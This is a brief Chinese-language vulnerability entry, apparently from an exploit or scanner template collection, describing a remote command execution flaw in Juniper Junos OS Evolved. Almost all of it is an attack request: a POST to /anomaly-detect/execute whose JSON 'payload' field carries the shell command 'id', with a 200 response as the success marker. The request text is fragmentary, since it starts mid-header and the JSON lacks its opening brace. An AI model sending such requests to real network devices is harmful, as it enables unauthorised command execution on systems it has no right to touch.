# JuniperJunosOSEvolved存在远程代码执行漏洞

JuniperJunosOSEvolved ｜ 命令执行 ｜ —
- **请求**：`POST /anomaly-detect/execute HTTP/1.1`

**Payload**
```
like Gecko) Chrome/91.0.4472.77 Safari/537.36
Content-Type: application/json
"action": "diagnose",
"payload": "id"
}
```
- **响应特征**：200